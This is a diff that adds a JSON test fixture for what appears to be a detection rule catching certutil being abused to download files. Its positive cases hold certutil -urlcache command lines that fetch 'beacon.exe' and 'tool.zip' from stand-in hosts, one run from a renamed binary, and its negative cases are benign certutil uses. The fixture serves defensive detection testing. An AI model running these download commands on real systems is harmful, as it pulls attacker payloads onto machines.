@@ -1,0 +1,63 @@
+{
+  "should_match": [
+    {
+      "description": "urlcache download",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/beacon.exe C:\\Users\\Public\\b.exe",
+        "ParentImage": "C:\\Windows\\explorer.exe"
+      }
+    },
+    {
+      "description": "slash flags and https",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil /urlcache /f https://evil.example/tool.zip t.zip",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "OriginalFileName": "CertUtil.exe"
+      }
+    },
+    {
+      "description": "renamed binary (OriginalFileName)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WIN-FIN-07",
+          "User": "CORP\\j.doe",
+          "Image": "C:\\Users\\Public\\cu.exe",
+          "CommandLine": "certutil.exe -urlcache -f http://198.51.100.7/beacon.exe C:\\Users\\Public\\b.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "OriginalFileName": "CertUtil.exe"
+        }
+    }
+  ],
+  "should_not_match": [
+    {
+      "description": "certutil hashing a file",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -hashfile setup.exe SHA256",
+        "ParentImage": "C:\\Windows\\explorer.exe"
+      }
+    },
+    {
+      "description": "certutil urlcache without URL (cache listing)",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -urlcache *",
+        "ParentImage": "C:\\Windows\\explorer.exe"
+      }
+    }
+  ]
+}
